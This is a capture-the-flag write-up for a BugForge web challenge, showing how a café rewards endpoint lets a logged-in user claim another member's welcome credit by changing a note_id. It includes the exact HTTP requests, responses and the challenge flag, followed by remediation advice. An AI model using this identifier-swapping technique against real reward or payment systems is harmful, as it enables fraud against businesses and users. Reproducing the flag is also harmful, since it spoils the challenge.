# Cafe Club – cafeclub-012 – We all like gifts.

## Challenge Overview

- **Platform:** BugForge
- **Challenge:** Cafe Club
- **Category:** Web Security
- **Vulnerability:** Insecure Direct Object Reference(IDOR) / Broken Access Control
- **Objective:** Exploit improper welcome-credit redemption validation and retrieve the flag.

### Hint

> We all like gifts.

The hint directs us toward gift or reward functionality within Cafe Club.

---

## 1. Application Reconnaissance

After launching the challenge, access the Cafe Club web application and register a test account.

Navigate to the **Rewards** page.

The application displays the following welcome reward:

### New-member Welcome Credit

> As a thank-you for joining CafeClub, enjoy a one-time £5.00 café credit on your account.

Membership reference:

```text
#44556
```

Claim the welcome credit and capture the HTTP request using Burp Suite.

---

## 2. Analyze the Welcome Credit Request

### HTTP Request

```http
POST /api/rewards/claim HTTP/2
Host: lab-1794141118116-9fuh1i.labs-app.bugforge.io
Authorization: Bearer <JWT>
Content-Type: application/json

{"note_id":44556}
```

### Initial Response

```json
{
  "message": "£5.00 welcome credit added to your account.",
  "amount": 500,
  "note_id": 44556,
  "balance": 500,
  "balance_display": "£5.00"
}
```

### Observations

- The application uses a POST endpoint to redeem welcome credits.
- The reward identifier is supplied through the `note_id` parameter.
- The server returns the credited amount and account balance.
- The original welcome credit adds £5.00 to the account.
- The JWT identifies the authenticated user.

The request contains a client-controlled reward identifier, making it a potential attack surface for authorization testing.

---

## 3. Test Invalid Reward Identifier

Send the following request through Burp Repeater:

### Request

```http
POST /api/rewards/claim HTTP/2
Content-Type: application/json

{"note_id":44557}
```

### Response

```json
{
  "error": "Welcome credit note not found"
}
```

### Analysis

The server validates whether the supplied welcome-credit note exists.

An arbitrary identifier does not produce a valid reward.

---

## 4. Test Duplicate Redemption

Replay the original request:

### Request

```json
{
  "note_id":44556
}
```

### Response

```json
{
  "error": "This welcome credit note has already been claimed."
}
```

### Analysis

The application prevents the same welcome-credit note from being redeemed repeatedly.

However, this validation does not necessarily guarantee that the authenticated user is authorized to redeem other valid welcome-credit notes.

---

## 5. Exploit the Reward Authorization Flaw

The next step is to test a different valid welcome-credit note.

Modify the request in Burp Repeater.

### Modified Request

```http
POST /api/rewards/claim HTTP/2
Content-Type: application/json

{"note_id":44555}
```

### Successful Response

```json
{
  "message": "£5.00 welcome credit added to your account.",
  "amount": 500,
  "note_id": 44555,
  "balance": 1000,
  "balance_display": "£10.00",
  "flag": "bug{CFeBis6uzm6PmtBFyeGJuY7PPBk1kbAA}"
}
```

### Result

The application successfully redeemed another welcome-credit note and credited an additional £5.00 to the authenticated account.

The response also disclosed the challenge flag.

---

## 6. Flag

```text
bug{CFeBis6uzm6PmtBFyeGJuY7PPBk1kbAA}
```

---

## 7. Vulnerability Analysis

### Vulnerability Type

- Broken Access Control
- Improper Object-Level Authorization
- Business Logic Vulnerability
- IDOR-style reward redemption flaw

### Root Cause

The reward redemption endpoint appears to validate the existence and redemption status of a welcome-credit note without adequately enforcing whether the authenticated user is entitled to redeem that specific note.

The application accepts a different valid reward identifier and credits the authenticated account.

### Security Impact

An attacker may potentially:

- Redeem welcome credits belonging to other users.
- Obtain unauthorized account credits.
- Abuse reward redemption functionality.
- Manipulate the application's reward accounting system.

The demonstrated impact is unauthorized redemption of an additional £5.00 welcome credit.

---

## 8. Remediation

The backend should enforce authorization and reward eligibility independently of client-controlled identifiers.

### Recommended Security Controls

1. **Object-Level Authorization**

   Verify that the requested reward belongs to the authenticated user or is explicitly redeemable by that user.

2. **Server-Side Eligibility Validation**

   Determine reward eligibility using trusted backend data rather than relying on identifiers supplied by the client.

3. **Atomic Redemption**

   Ensure that checking eligibility and redeeming the reward occur within a single database transaction.

4. **One-Time Redemption Enforcement**

   Maintain a database constraint or transaction-safe mechanism preventing duplicate reward claims.

5. **Audit Logging**

   Record suspicious redemption attempts, including invalid reward identifiers and unauthorized claims.

6. **Secure Error Handling**

   Avoid revealing unnecessary information about reward records belonging to other users.

### Example Authorization Logic

```python
def claim_reward(user, note_id):
    reward = get_reward(note_id)

    if not reward:
        return {"error": "Reward not found"}

    if reward.owner_id != user.id:
        return {"error": "Unauthorized"}

    if reward.claimed:
        return {"error": "Reward already claimed"}

    redeem_reward_atomically(user, reward)

    return {
        "message": "Reward successfully claimed"
    }
```

This is illustrative pseudocode demonstrating the required authorization checks.

---

## 9. Lessons Learned

- Never trust client-controlled object identifiers.
- Authentication does not automatically provide authorization.
- Validate ownership and eligibility on the backend.
- Test reward systems for business logic flaws.
- Duplicate-claim protection alone does not prevent unauthorized redemption.
- Always inspect server responses for additional information or challenge flags.

---

## 10. Conclusion

The Cafe Club challenge demonstrated how improper authorization in reward redemption can allow an authenticated user to claim another valid welcome-credit note.

By intercepting the redemption request, analyzing its parameters, and testing a different valid reward identifier, the authorization flaw was identified and exploited.

The challenge was successfully completed, and the flag was retrieved.

**Status:** SOLVED